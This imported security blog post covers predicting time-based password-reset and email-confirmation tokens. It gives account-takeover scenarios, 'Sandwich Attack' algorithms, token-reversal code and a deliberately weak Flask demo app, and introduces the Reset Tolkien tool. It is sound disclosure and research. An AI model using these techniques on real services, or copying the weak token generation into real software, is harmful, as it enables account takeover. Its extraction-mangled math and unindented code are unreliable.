---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-03-29_unsecure-time-based-secret-and-sandwich-attack-analysis-of-my-research-and-relea.md
original_filename: 2024-03-29_unsecure-time-based-secret-and-sandwich-attack-analysis-of-my-research-and-relea.md
title: Unsecure time-based secret and Sandwich Attack - Analysis of my research and
  release of the “Reset Tolkien” tool
category: documents
detected_topics:
- password-reset
- sqli
- race-condition
- sso
- idor
- command-injection
tags:
- imported
- documents
- password-reset
- sqli
- race-condition
- sso
- idor
- command-injection
language: en
raw_sha256: 637994f9ffd9315acf42383d89e5876d5f85e2f3bbbc99dd967a5e501e841911
text_sha256: 798c698a12218592af7eb58e0caab8bc96ba2165eb287bd98a580ca0e06d8989
ingested_at: '2026-06-28T07:32:32Z'
sensitivity: unknown
redactions_applied: true
---

# Unsecure time-based secret and Sandwich Attack - Analysis of my research and release of the “Reset Tolkien” tool

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-03-29_unsecure-time-based-secret-and-sandwich-attack-analysis-of-my-research-and-relea.md
- Source Type: markdown
- Detected Topics: password-reset, sqli, race-condition, sso, idor, command-injection
- Ingested At: 2026-06-28T07:32:32Z
- Redactions Applied: True
- Raw SHA256: `637994f9ffd9315acf42383d89e5876d5f85e2f3bbbc99dd967a5e501e841911`
- Text SHA256: `798c698a12218592af7eb58e0caab8bc96ba2165eb287bd98a580ca0e06d8989`


## Content

---
title: "Unsecure time-based secret and Sandwich Attack - Analysis of my research and release of the “Reset Tolkien” tool"
page_title: "[EN] Unsecure time-based secret and Sandwich Attack - Analysis of my research and release of the “Reset Tolkien” tool"
url: "https://www.aeth.cc/public/Article-Reset-Tolkien/secret-time-based-article-en.html"
final_url: "https://www.aeth.cc/public/Article-Reset-Tolkien/secret-time-based-article-en.html"
authors: ["Aethlios (@AethliosIK)"]
bugs: ["Sandwich Attack"]
publication_date: "2024-03-29"
added_date: "2024-07-22"
source: "pentester.land/writeups.json"
original_index: 360
---

# __[EN] Unsecure time-based secret and Sandwich Attack - Analysis of my research and release of the “Reset Tolkien” tool

![Reset Tolkien Picture](https://www.aeth.cc/public/Article-Reset-Tolkien/reset-tolkien.png)

#  __Abstract

In this article, I detail my research into time-based secrets. This research began for me a year ago, following a finding during a Bug bounty program, and enabled me to take the time to implement my Python tool: [“**Reset Tolkien** ”](https://github.com/AethliosIK/reset-tolkien).

# __Table of Content

  * [EN] Unsecure time-based secret and Sandwich Attack - Analysis of my research and release of the “Reset Tolkien” tool
  * Abstract
  * Table of Content
  * I - First vulnerability: PHP function uniqid and password reset
  * I.1 - Context
  * I.2 - Hypothesis
  * I.3 - Attack scenario
  * I.4 - Beginning of the adventure
  * II - Second vulnerability: Mongo DB ObjectID and e-mail address confirmation
  * II.1 - Context
  * II.2 - Hypothesis
  * II.3 - Attack scenario
  * III - Research
  * III.1 - StackOverflow overview
  * III.1.1 - The bad choices, but that doesn’t help us
  * III.1.2 - The bad choices, and it’s interesting
  * III.1.3 - The good choices
  * III.2 - Limits of our previous scenarios
  * III.3 - The end of the adventure?
  * IV - Theories and algorithms
  * IV.1 - First step: known generation date
  * IV.1.1 - Detection algorithm
  * IV.1.2 - Attack algorithm
  * IV.2 - Second step: taking hash functions into account
  * IV.2.1 - Detection algorithm using hash functions
  * IV.2.2 - Attack algorithm using hash functions
  * IV.3 - Third stage: precise generation date unknown
  * IV.3.1 - Detection algorithm with arbitrary time frame
  * IV.3.2 - Attack algorithm with arbitrary time frame
  * IV.4 - Fourth step - Optimizing the attack by reducing Oracle solicitations
  * IV.4.1 - Sandwich attack scenario
  * IV.4.2 - Sandwich attack algorithm
  * IV.5 - Conclusion
  * V - Practice
  * V.2 - Scenario confirming the hypothesis
  * V.3 - Sandwich attack scenario
  * VI - Reset Tolkien
  * VI.1 - Introduction
  * VI.2 - Encoding and hash function supported
  * VI.3 - Usage
  * VI.4 - Practical example
  * VI.5 - Default tests
  * VI.6 - Customised test configuration
  * VI.7 - The “Todo” list
  * VII - Conclusion
  * Credits

# __I - First vulnerability: PHP function`uniqid` and password reset

##  __I.1 - Context

During a bug bounty program, I found an application with very poor features. I’m forced to focus on the relatively classic features of the application, such as the password reset feature.

A few weeks ago, I produced a CTF challenge on this feature. A “ _dream_ ” challenge, i.e. one that I don’t think is possible on a production application.

For this challenge, I imagined a password reset functionality based on the Python `random` pseudo-random generator.

  * **Spoiler** : by generating and retrieving a large number of reset tokens, it’s possible to predict future tokens generated.

It was nice to design, but well, it’s not possible to find that, is it? Let’s find out…

##  __I.2 - Hypothesis

So I’m testing this perimeter with this challenge in mind. By generating tokens with my own account, almost at the same time, I obtain these two tokens:

  * `655f254b2d821`
  * `655f254b2d82e`

Then I had an idea:

> What if it were simpler than pseudo-random? What if these tokens were only time-based?

Tips: To make it easier to retrieve the date of the request, you can use the HTTP header `Date` from the HTTP response to the password reset request. This header is defined as mandatory by the [RFC-2616](https://www.rfc-editor.org/rfc/rfc2616#section-14.18).

By following these steps, I manage to find out that this token is indeed generated from the generation date:

  * The PHP function `uniqid` is used and is based on the current date to generate a unique but predictable ID.

Here’s the function implemented in Python:
  
  
  import math
  
  def uniqid(timestamp: float):
  sec = math.floor(timestamp)
  usec = round(1000000 * (timestamp - sec))
  return "%8x%05x" % (sec, usec)
  
  def reverse_uniqid(value: str):
  return float(
  str(int(value[:8], 16))
  + "."
  + str(int(value[8:], 16))
  )
  
  import datetime
  
  def check():
  t = datetime.datetime.now().timestamp()
  u = uniqid(t)
  return t == reverse_uniqid(u)
  
  # >>> check()
  # True
  

From our two previous tokens, we are able to **retrieve the corresponding generation dates** :
  
  
  tokens = ["655f254b2d821", "655f254b2d82e"]
  for token in tokens:
  t = float(reverse_uniqid(token))
  d = datetime.datetime.fromtimestamp(t)
  print(f"{token} - {t} => {d}")
  
  # 655f254b2d821 - 1700734283.186401 => 2023-11-23 11:11:23.186401
  # 655f254b2d82e - 1700734283.186414 => 2023-11-23 11:11:23.186414
  

## __I.3 - Attack scenario

By confirming this hypothesis, I’m now able to create an attack scenario that will impact other users:

  * Create an account on the tested perimeter.
  * Request a password reset token on a controlled email and note the date of the request.
  * Retrieve the token and detect token formatting to confirm that the token was generated from a date later than the request date.
  * Perform a reset token request on the victim’s account and note the date of the request.
  * Apply the formatting deduced from the request date to generate the victim’s reset token.
  * Reset the victim’s password.

With just the prerequisite of the victim’s email address, I’m able to reset his password. On the perimeter concerned, I can change his email using the new password and perform a full-account takeover. The report will be accepted as “**Critical** ”.

## __I.4 - Beginning of the adventure

On finding this vulnerability, I’m trying to reproduce this exploit on a large number of Bug bounty perimeters using a more detailed scenario:

  * Create an account on the tested perimeter.
  * Retrieve the HTTP request for a password reset from Burp’s “ _Repeater_ ” tab.
  * Execute this request sequentially, twice, using Burp’s “ _Send group in parallel_ ” request functionality, and note the dates of the two requests.
  * Retrieve the two tokens from my e-mail address.
  * Evaluate the [entropy](https://en.wikipedia.org/wiki/Entropy) of these two tokens.
  * If entropy is low, guess the tokens’ format.
  * If the generation date can be found without any further prerequisites, the hypothesis that these tokens are based on the generation date is confirmed.

# __II - Second vulnerability: Mongo DB ObjectID and e-mail address confirmation

##  __II.1 - Context

During my various manual searches using the previous scenario, I spot an intriguing case on another functionality than password reset. When confirming an email address, I spot this format similarity:

  * `65c7e6f47ded1f0fef0c1006`
  * `65c7e6f47ded1f0fef0c1007`

This low entropy reminds me of the previous case, but with a different `uniqid` format. After some research, these tokens correspond to **an Object ID generated by MongoDB** , made up of three different pieces of information:

  1. **Timestamp** : time in seconds the object was accessed in the database.
  2. **Process** : unique value extracted from the machine and process used.
  3. **Counter** : counter incremented from a random value.

This is the format implemented in Python:
  
  
  def MongoDB_ObjectID(timestamp, process, counter):
  return "%08x%10x%06x" % (
  timestamp,
  process,
  counter,
  )
  
  def reverse_MongoDB_ObjectID(token):
  timestamp = int(token[0:8], 16)
  process = int(token[8:18], 16)
  counter = int(token[18:24], 16)
  return timestamp, process, counter
  
  
  def check(token):
  (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)
  return token == MongoDB_ObjectID(timestamp, process, counter)
  
  token = "65c7e6f47ded1f0fef0c1006"
  (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)
  
  # >> {"token": token, "timestamp": timestamp, "process": process, "counter": counter}
  # {'token': '65c7e6f47ded1f0fef0c1006', 'timestamp': 1707599604, 'process': 540849147887, 'counter': 790534}
  # >> check(token)
  # True
  

## __II.2 - Hypothesis

From a token, we are able to extract the information needed to generate that token.  
This information will be used to guess the next token:

  1. **Timestamp** : in the event of concurrent generation, the value is identical to that of the previous token.
  2. **Process** : unique value from machine and process.
  3. **Counter** : in the case of sequential generation, the value corresponds to the incremented value of the previous token.

By implementing an attack scenario similar to the first vulnerability, the success of the attack is not guaranteed. Indeed, tokens may be generated by different machines and/or processes. It is therefore necessary to list the different values in order to generate the token with the value corresponding to the machine and process used.

## __II.3 - Attack scenario

  * Create an account on the tested perimeter.
  * Perform several email changes on a controlled email.
  * Retrieve tokens in order to extract the various machine/process values.
  * Perform an email change on an uncontrolled email and note the date of the request.
  * Apply the formatting deduced from the request date to the various process values extracted.
  * If one of the tokens is valid, the uncontrolled email can be verified.

In the context of the application, I’m able to bypass email verification. The impact on the perimeter concerned is limited. However, this gives me the opportunity to imagine a use similar to the first vulnerability in another context, that of e-mail confirmation.

# __III - Research

Following these findings, I felt the need to explore this subject in more depth, in order to generalize this exploitation.

## __III.1 - StackOverflow overview

In order to generalize these cases, I needed more examples. Not just examples of black-box-generated tokens, but also examples of source code. Using my favorite search engine, I drew up a representative sample of implementations of password reset functionality. I looked for “ _good_ ”" and “ _bad_ ” implementations.

As my search began with the discovery of the PHP function `uniqid`, I focused on PHP source code examples. Here’s a best-of.

### __III.1.1 - The bad choices, but that doesn’t help us

  * [**Example 1.1** \- Password Reset System Using PHP](https://talkerscode.com/webtricks/password-reset-system-using-php.php)

  
  
  while($row=mysql_fetch_array($select))
  {
  $email=md5($row['email']);
  $pass=md5($row['password']);
  }
  $link="<a href='www.samplewebsite.com/reset.php?key=".$email."&reset=".$pass."'>Click To Reset password</a>";
  

Here, the developer chooses to send the user’s password hash as a password reset token.

  * **Bad choice** : if the user’s mailbox is compromised, the attacker can retrieve the password hash. What’s the point of finding SQL Injection when you see this, eh?

In any case, it doesn’t interest us in our study, as it would be like guessing the hash of the victim’s password in order to reset it.

  * [**Example 1.2** \- PHP Forgot Password Recover Code](https://phppot.com/php/php-forgot-password-recover-code/)

  
  
  $token = $this->generateRandomString(97);
  
  [...]
  
  function generateRandomString($length = 10)
  {
  $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  $charactersLength = strlen($characters);
  $randomString = '';
  for ($i = 0; $i < $length; $i ++) {
  $randomString .= $characters[rand(0, $charactersLength - 1)];
  }
  return $randomString;
  }
  

Here, the developer chooses to use the pseudo-random function `rand()` to generate a token. If we are able to generate enough tokens, it would be possible to predict the next values of the following tokens. Which just goes to show that the CTF test I mentioned earlier **wasn’t all it was cracked up to be**.

Interestingly, if you’d like to study this in more detail, there are a number of exploitation examples:

  * [Exploiting Weak Pseudo-Random Number Generation in PHP’s rand and srand Functions](https://medium.com/@moorejacob2017/exploiting-weak-pseudo-random-number-generation-in-phps-rand-and-srand-functions-445229b83e01).

But this is not the subject of our study.

### __III.1.2 - The bad choices, and it’s interesting

  * [**Example 2.1** \- Send Reset/Forgot Password Link in Email PHP Mysql](https://www.tutsmake.com/send-reset-password-link-email-php/)

  
  
  $token = md5($emailId).rand(10,9999);
  $link = "<a href='www.yourwebsite.com/reset-password.php?key=".$emailId."&token=".$token."'>Click To Reset password</a>";
  

Here, the developer chooses to use the user ID value hashed and concatenated to a random value contained between 10 and 9999.

This is interesting: **if we know the victim’s ID, all we have to do is try the 9991 possibilities to find the victim’s token.**

_Let’s note, let’s note_

  * [**Example 2.2** \- Forgot Password github](https://github.com/suresh-pokharel/forgot-password/blob/master/forgot_password.php#L21)

  
  
  $key=md5(time()+123456789% rand(4000, 55000000));
  

The developer uses a timestamp as a basis, but adds a value based on randomness, and then hashes the result in MD5.

This sounds complicated to exploit, but it points to an essential piece of information: **it’s possible that some developers choose hash functions to hide values that wouldn’t be cryptographically secure.**

_Note again, note again._

### __III.1.3 - The good choices

  * [**Example 3.1** \- Forgot Password and password reset form in PHP with MYSQL ](https://technosmarter.com/php/forgot-password-and-password-reset-form-in-php)

  
  
  $token = bin2hex(random_bytes(50));
  

This is a good example of what **is secured** from a cryptographically secure [`random_bytes`](https://www.php.net/manual/en/function.random-bytes.php) function.

_Don’t note, don’t note._

## __III.2 - Limits of our previous scenarios

Looking at the previous examples of source code, it’s possible to draw some conclusions:

  * Some tokens can be **based on the user’s own values** , such as email or ID.
  * Some tokens may be **results of hash functions** that add entropy to values that would not be cryptographically secure.
  * Some tokens may be **based on a date with fine precision** , making the prerequisite of knowing the token’s generation date uncertain.

## __III.3 - The end of the adventure?

These two findings gave me the opportunity to inspect the various time-based functions.  
These functions should not be used in contexts that require cryptographically secure secrets.

I need to automate this search. However, I face a constraint:

  * **How can I automate the creation of an account, the request to reset a password and then the retrieval of the token in a multi-perimeter context?**

Each perimeter has different technologies and differently implemented functionalities. However, once a token has been retrieved, it is still possible to automate the detection of formatting and confirmation of the hypothesis, as well as the attack.

_So the adventure doesn’t end there for me._

# __IV - Theories and algorithms

So let’s take a moment to theorize, based on the practical cases we’ve discovered and the lessons we’ve learned from our research into source code examples.

## __IV.1 - First step: known generation date

Let’s try to describe different algorithms for generalizing the search for a token’s format, assuming that the token’s generation date is known.

### __IV.1.1 - Detection algorithm

It is therefore possible to create a first algorithm which, from a list of functions of possible format FF, **determines whether the token is based on the token generation date** :

  * Inputs:

  * FF set of f,f-1f,f-1 such as s=f-1(f(s))s=f-1(f(s))
  * tokenattackertokenattacker
  * dateattackerdateattacker
  * infoiattacker∀i≥0infoattackeri∀i≥0
  * Outputs:

  * f∈Ff∈F or nullnull
  * Algorithm: native_detectnative_detect

  * ∀f,f-1∈F∀f,f-1∈F
  * If dateattackerdateattacker = f-1(tokenattacker,infoiattacker)∀i≥0f-1(tokenattacker,infoattackeri)∀i≥0 then 
  * Return ff
  * Return null

### __IV.1.2 - Attack algorithm

Once the hypothesis has been confirmed, we can provide an algorithm to **generate the victim’s token based on the generation date** :

  * Inputs:

  * FF set of f,f-1f,f-1 such as s=f-1(f(s))s=f-1(f(s))
  * tokenattackertokenattacker
  * dateattackerdateattacker
  * infoiattacker∀i≥0infoattackeri∀i≥0
  * datevictimdatevictim
  * infoivictim∀i≥0infovictimi∀i≥0
  * Outputs:

  * tokenvictimtokenvictim or nullnull
  * Algorithm: native_attacknative_attack

  * f←native_detect(F,tokenattacker,dateattacker,infoiattacker)f←native_detect(F,tokenattacker,dateattacker,infoattackeri) ∀i≥0∀i≥0
  * If f≠nullf≠null then 
  * tokenvictim←f(datevictim,infoivictim)tokenvictim←f(datevictim,infovictimi) ∀i≥0∀i≥0
  * Return tokenvictimtokenvictim
  * Else return nullnull

## __IV.2 - Second step: taking hash functions into account

Previous algorithms took into account the possibility of knowing the inverse of a function, but if we want to take into account token formats using hash functions, by definition, **we can’t define the inverse function.**

We therefore need to invert and base ourselves on the date, apply the formatting functions and compare the value obtained with the token provided as input.

### __IV.2.1 - Detection algorithm using hash functions

From the token generation date, we need to confirm which hash function is used:

  * Inputs:

  * HH set of h,vh,v such as v(h(s))v(h(s)) is a success ∀s∈STRINGS∀s∈STRINGS
  * tokenattackertokenattacker
  * dateattackerdateattacker
  * infoiattacker∀i≥0infoattackeri∀i≥0
  * Outputs:

  * h∈Hh∈H or nullnull
  * Algorithm: detect_with_hashdetect_with_hash

  * ∀h,v∈H∀h,v∈H
  * If v(tokenattacker)v(tokenattacker) is a success then 
  * If tokenattackertokenattacker = h(dateattacker,infoiattacker)∀i≥0h(dateattacker,infoattackeri)∀i≥0 then 
  * Return hh
  * Return nullnull

### __IV.2.2 - Attack algorithm using hash functions

We can therefore provide an algorithm that will generate the victim’s token from the generation date:

  * Inputs:

  * HH set of h,vh,v such as v(h(s))v(h(s)) is a success ∀s∈STRINGS∀s∈STRINGS
  * tokenattackertokenattacker
  * dateattackerdateattacker
  * infoiattacker∀i≥0infoattackeri∀i≥0
  * datevictimdatevictim
  * infoivictim∀i≥0infovictimi∀i≥0
  * Outputs:

  * tokenvictimtokenvictim or nullnull
  * Algorithm: attack_with_hashattack_with_hash

  * h←detect_with_hash(H,tokenattacker,dateattacker,infoiattacker)h←detect_with_hash(H,tokenattacker,dateattacker,infoattackeri) ∀i≥0∀i≥0
  * If f≠nullf≠null then 
  * tokenvictim←f(datevictim,infoivictim)tokenvictim←f(datevictim,infovictimi) ∀i≥0∀i≥0
  * Return tokenvictimtokenvictim
  * Else return nullnull

## __IV.3 - Third stage: precise generation date unknown

Previous algorithms took into account the prerequisite of precise knowledge of the token generation date. However, when a reset request is made, we can retrieve **the date of the request** , but this **is not necessarily the date on which the token was generated**. In fact, there may be a delay between the two dates. What’s more, if the token is based on a time with a precision finer than seconds, we can’t be sure of the token’s generation date.

However, the request date is bound to be close to the generation date. We can therefore **try to guess the generation date by incrementing the request date up** to an arbitrary limit, which will convince us that our hypothesis is wrong.

### __IV.3.1 - Detection algorithm with arbitrary time frame

It is possible to define an arbitrary time frame from the date of the request to determine whether the token was generated by one of these dates:

  * Constants:

  * dafterdafter: _delay after request date_
  * Inputs:

  * DattackerDattacker set of dattacker∈[dateattacker;dateattacker+dafter]dattacker∈[dateattacker;dateattacker+dafter]
  * HH set of h,vh,v such as v(h(s))v(h(s)) is a success ∀s∈STRINGS∀s∈STRINGS
  * tokenattackertokenattacker
  * dateattackerdateattacker
  * infoiattacker∀i≥0infoattackeri∀i≥0
  * Outputs:

  * h∈Hh∈H or nullnull
  * d∈Dd∈D or nullnull
  * Algorithm: detect_with_timeframedetect_with_timeframe

  * ∀h,v∈H∀h,v∈H
  * If v(tokenattacker)v(tokenattacker) is a success then 
  * ∀dattacker∈Dattacker∀dattacker∈Dattacker
  * If tokenattackertokenattacker = h(dattacker,infoiattacker)∀i≥0h(dattacker,infoattackeri)∀i≥0 then 
  * Return h,dattackerh,dattacker
  * Return null,nullnull,null

### __IV.3.2 - Attack algorithm with arbitrary time frame

To perform the attack, we need to consider **the existence of an oracle** , named verifyverify, **which confirms that a token is valid** :

  * Inputs:

  * DattackerDattacker set of dattacker∈[dateattacker;dateattacker+dafter]dattacker∈[dateattacker;dateattacker+dafter]
  * HH set of h,vh,v such as v(h(s))v(h(s)) is a success ∀s∈STRINGS∀s∈STRINGS
  * verifyverify such as verify(tokenvictim)verify(tokenvictim) is a success
  * tokenattackertokenattacker
  * dateattackerdateattacker
  * infoiattacker∀i≥0infoattackeri∀i≥0
  * datevictimdatevictim
  * infoivictim∀i≥0infovictimi∀i≥0
  * Outputs:

  * tokenvictimtokenvictim or nullnull
  * Algorithm: attack_with_timeframeattack_with_timeframe

  * h,dattacker←detect_with_timeframe(F,tokenattacker,dateattacker,infoiattacker)h,dattacker←detect_with_timeframe(F,tokenattacker,dateattacker,infoattackeri) ∀i≥0∀i≥0
  * If h≠nullh≠null then 
  * ∀dvictim∈Dvictim∀dvictim∈Dvictim
  * tokenvictim←h(dvictim,infoivictim)tokenvictim←h(dvictim,infovictimi) ∀i≥0∀i≥0
  * If verify(tokenvictim)verify(tokenvictim) is a success then 
  * Return tokenvictimtokenvictim
  * Else return nullnull

## __IV.4 - Fourth step - Optimizing the attack by reducing Oracle solicitations

In the previous step, we verify the validity of a victim’s token against an arbitrarily defined time frame and an oracle.  
This oracle could be a script that verifies the token’s validity by means of an HTTP request via the web application.

The wider the time frame, the higher the probability of finding a valid token, but the more solicitous the oracle. In the case of limiting the use of the oracle, **we want to optimize the size of the time frame** without reducing the certainty of hypothesis confirmation.

It is possible to **limit the time frame between two tokens** in the attacker’s account. This type of attack is known as a **“Sandwich Attack”**.

Here’s a very good reference on this type of attack:

  * [0 Click ATO with the Sandwich Attack](https://www.landh.tech/blog/20230811-sandwich-attack).

### __IV.4.1 - Sandwich attack scenario

  * Create an account on the tested perimeter.
  * Perform 3 **sequential** reset token generation requests: 
  * The first on a controlled account
  * The second on a non-controlled account
  * The third on a controlled account
  * Retrieve the tokens to extract the dates of the first and third token requests to define a time frame during which the second token was generated.
  * Generate possible tokens from this time frame.
  * Confirm the valid token with the oracle.

### __IV.4.2 - Sandwich attack algorithm

Let’s try to define an algorithm to guess the generation date of the victim’s token:

  * Inputs:

  * HH set of h,vh,v such as v(h(s))v(h(s)) is a success ∀s∈STRINGS∀s∈STRINGS
  * verifyverify such as verify(tokenvictim)verify(tokenvictim) is a success
  * token1attackertokenattacker1
  * date1attackerdateattacker1
  * token3attackertokenattacker3
  * date3attackerdateattacker3
  * infoiattacker∀i≥0infoattackeri∀i≥0
  * date2victimdatevictim2
  * infoivictim∀i≥0infovictimi∀i≥0
  * Outputs:

  * tokenvictimtokenvictim or nullnull
  * Algorithm: sandwich_attacksandwich_attack

  * h,d1attacker←detect_with_timeframe(F,token1attacker,date1attacker,infoiattacker)h,dattacker1←detect_with_timeframe(F,tokenattacker1,dateattacker1,infoattackeri) ∀i≥0∀i≥0
  * h,d3attacker←detect_with_timeframe(F,token3attacker,date3attacker,infoiattacker)h,dattacker3←detect_with_timeframe(F,tokenattacker3,dateattacker3,infoattackeri) ∀i≥0∀i≥0
  * If h≠nullh≠null then 
  * ∀d2victim∈[d1attacker;d3attacker]∀dvictim2∈[dattacker1;dattacker3]
  * token2victim←h(d2victim,infoivictim)tokenvictim2←h(dvictim2,infovictimi) ∀i≥0∀i≥0
  * If verify(token2victim)verify(tokenvictim2) is a success then 
  * Return token2victimtokenvictim2
  * Else return nullnull

## __IV.5 - Conclusion

Thanks to these algorithms and the generation date prerequisite, **we are able to confirm the hypothesis that a token is time-based**.

Once this hypothesis has been confirmed, we can **bound the generation date of the victim token between two tokens generated from the attacker’s account**. The oracle will allow us to confirm which of the tokens is the victim’s.

# __V - Practice

Let’s imagine a web application implementing password reset functionality. Here’s an example of a web application with [Flask](https://flask.palletsprojects.com) and [SQLite](https://www.sqlite.org/index.html):
  
  
  from flask import Flask, request
  import sqlite3
  
  DATABASE_NAME = "reset.db"
  
  
  # Database initialization with table definition
  def init_db():
  database = sqlite3.connect(DATABASE_NAME)
  cursor = database.cursor()
  cursor.execute(
  """
  CREATE TABLE reset(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  email TEXT,
  token TEXT
  )
  """
  )
  
  
  # Store the token in database with the provided email
  def store_token_in_db(email, token):
  database = sqlite3.connect(DATABASE_NAME)
  cursor = database.cursor()
  cursor.execute("INSERT INTO reset(email, token) VALUES(?, ?)", (email, token))
  database.commit()
  
  
  # Verify the validity of provided token - the token is deleted from the database after usage
  def verify(email, token):
  database = sqlite3.connect(DATABASE_NAME)
  cursor = database.cursor()
  cursor.execute("SELECT token FROM reset WHERE email = ? ORDER BY id DESC", (email,))
  tokens = cursor.fetchone()
  if tokens:
  success = token == tokens[0]
  if success:
  cursor.execute(
  "DELETE FROM reset WHERE email = ? AND token = ?", (email, token)
  )
  database.commit()
  return success
  return False
  
  
  # Generate a formatted token
  def generate_token():
  # Not implemented
  
  app = Flask(__name__)
  
  
  @app.route("/reset", methods=["GET"])
  def reset():
  token = request.args.get("token", None)
  email = request.args.get("email", None)
  # Verify
  if token and email:
  if verify(email, token):
  return "Valid!"
  return "Expired token!"
  # Generate
  elif email:
  token = generate_token()
  store_token_in_db(email, token)
  if token:
  return f"Email sent to {email}: <a id='token' href='/reset?email={email}&token={token}'>{token}</a>"
  return "Error"
  # Provide form
  return "<html><body><form><label for='email'>Email: </label><input name='email'></input></form>"
  
  
  import os
  
  if __name__ == "__main__":
  if not os.path.isfile(DATABASE_NAME):
  init_db()
  app.run()
  

This application **implements three functionalities** on the same route:

  * `GET /reset`: Get the HTTP form to make a request to generate a password reset token.
  * `GET /reset?email=[EMAIL]`: Generate a token from the email (normally sent by email, but here the token is provided in the response).
  * `GET /reset?email=[EMAIL]&token=[TOKEN]`: Check the validity of a token for a given email.

This application generates a value from the current time, then applies formatting to it before sending this token to the user’s email. Here’s a sample implementation:
  
  
  # Generate a formatted token
  def generate_token():
  import datetime
  import hashlib
  
  t = datetime.datetime.now().timestamp()
  token = hashlib.md5(str(t).encode()).hexdigest()
  return token
  

Testing this application in black box, we’ll see a token in MD5 format: `e6e1b03ab79ba996265417e78a6d80d2`, which **doesn’t allow us to guess that it’s a time-based token** , nor to evaluate the entropy of the value.

## __V.2 - Scenario confirming the hypothesis

Assuming that the token is time-based, we will now apply the scenario to confirm our hypothesis:

  * Access the token generation form on `/reset`.
  * Generate a token via `/reset?email=attacker@example.com`, noting the date of the request: dateattackerdateattacker
  * Retrieve the token: tokenattackertokenattacker (in a realistic case, we should retrieve it from our e-mail inbox)
  * Play our detection algorithm detect_with_timeframedetect_with_timeframe with as input: 
  * DvictimDvictim set of dvictim∈[datevictim;datevictimdvictim∈[datevictim;datevictim \+ 1 second]]
  * HH : `[(md5, is_md5)]`
  * tokenattackertokenattacker: token retrieved
  * dateattackerdateattacker: request date retrieved
  * infoiattacker∀i≥0infoattackeri∀i≥0 : no specific information
  * The outputs of the algorithm should provide us: 
  * hh: `md5`
  * dattackerdattacker: precise date of generation of our token
  * If the output of our algorithm is not null, the hypothesis is confirmed

## __V.3 - Sandwich attack scenario

To perform our attack, we’ll need to implement the verifyverify function, which is an oracle used to confirm the validity of a token:
  
  
  import request
  
  def verify(email, token):
  r = request.get(f"http://localhost:5000/reset?email={email}&token={token}")
  return r.status_code == 200 and r.text == "Valid!"
  

The goal of the scenario is to retrieve a token from a victim:

  * Access the token generation form on `/reset`.
  * **Sequentially** generate three tokens via `/reset?email=[EMAIL]` and retrieve the generation dates with email: 
  1. `/reset?email=attacker@example.com` -> date1attackerdateattacker1
  2. `/reset?email=victim@example.com` -> date2victimdatevictim2
  3. `/reset?email=attacker@example.com` -> date3attackerdateattacker3
  4.  * Retrieve the token (in a realistic case, we should retrieve it from our e-mail inbox): 
  * token1attackertokenattacker1
  * token3attackertokenattacker3
  * Play our sandwich_attacksandwich_attack detection algorithm with the following input: 
  * hh: `md5`
  * verifyverify: previously defined Python script
  * token1attackertokenattacker1: first attacker token retrieved
  * token3attackertokenattacker3: second attacker token retrieved
  * date1attackerdateattacker1: first attacker date retrieved
  * date2victimdatevictim2: victim’s first date retrieved
  * date3attackerdateattacker3: third attacker date retrieved
  * infoiattacker∀i≥0infoattackeri∀i≥0: no specific information
  * infoivictim∀i≥0infovictimi∀i≥0: no specific information
  * The outputs of the algorithm should give us: 
  * token2victimtokenvictim2
  * All that remains is to access `http://localhost:5000/reset?email=victim@example.com&token=[VICTIM_TOKEN]` to reset the user’s password and access the victim’s account.

Note: I have considered that **the Oracle confirms the validity of the token without causing it to expire**. If this is the case, you’ll need to automate the password reset as soon as the token is accessed for the first time, in order to succeed in the attack.

# __VI - Reset Tolkien

##  __VI.1 - Introduction

To enable this vulnerability to be exploited, I’ve taken the time to build a ready-to-use tool based on the previous algorithms.

I’ve _astutely_ (mmh…) named it [**"Reset Tolkien "**](https://github.com/AethliosIK/reset-tolkien).

This not only implements the previous algorithms literally, but also **adds concepts** that have not been mentioned, such as:

  * **Time zone** management.
  * Definition of **prefix values or suffixes** based on **account information**.

## __VI.2 - Encoding and hash function supported

The tool recursively tests different token formats:

  * `base32`
  * `base64`
  * `urlencode`
  * `hexint`
  * `hexstr`: ASCII integer encoding
  * `uniqid`: the PHP function `uniqid` previously studied
  * `uuidv1`: the format of a time-based UUID Version 1
  * `shortuuid`: a popular UUID encoding function
  * `mongodb_objectid`: the Mongo DB data format studied above
  * `datetime`: the encoding of a date from a custom date format
  * `datetimeRFC2822`: encoding a date using the format from the RFC2822 standard

The tool also manages the most popular hash functions:

  * `md5`
  * `sha1`
  * `sha224`
  * `sha256`
  * `sha384`
  * `sha512`
  * `sha3_224`
  * `sha3_256`
  * `sha3_384`
  * `sha3_512`
  * `blake_256`
  * `blake_512`

## __VI.3 - Usage

The various features of the tool are as follows:

  * `detect`: detects whether a provided token is based on a date, provided or not:

  
  
  usage: reset-tolkien detect [-h] [-r] [-v {0,1,2}] [-c CONFIG] [--threads THREADS] [--date-format-of-token ***REDACTED***] [--only-int-timestamp] [--decimal-length DECIMAL_LENGTH]
  [--int-timestamp-range INT_TIMESTAMP_RANGE] [--float-timestamp-range FLOAT_TIMESTAMP_RANGE] [--timezone TIMEZONE] [-l {1,2,3}] [-t TIMESTAMP] [-d DATETIME]
  [--datetime-format DATETIME_FORMAT] [--prefixes PREFIXES] [--suffixes SUFFIXES] [--hashes HASHES]
  token
  
  positional arguments:
  token  The token given as input.
  
  options:
  -h, --help  show this help message and exit
  -r, --roleplay  Not recommended if you don't have anything else to do
  -v {0,1,2}, --verbosity {0,1,2}
  Verbosity level (default: 0)
  -c CONFIG, --config CONFIG
  Config file to set TimestampHashFormat (default: default.yml)
  --threads THREADS  Define the number of parallelized tasks for the decryption attack on the hash. (default: 8)
  --date-format-of-token ***REDACTED***
  Date format for the token - please set it if you have found a date as input.
  --only-int-timestamp  Only use integer timestamp. (default: False)
  --decimal-length DECIMAL_LENGTH
  Length of the float timestamp (default: 7)
  --int-timestamp-range INT_TIMESTAMP_RANGE
  Time range over which the int timestamp will be tested before and after the input value (default: 60s)
  --float-timestamp-range FLOAT_TIMESTAMP_RANGE
  Time range over which the float timestamp will be tested before and after the input value (default: 2s)
  --timezone TIMEZONE  Timezone of the application for datetime value (default: 0)
  -l {1,2,3}, --level {1,2,3}
  Level of search depth (default: 3)
  -t TIMESTAMP, --timestamp TIMESTAMP
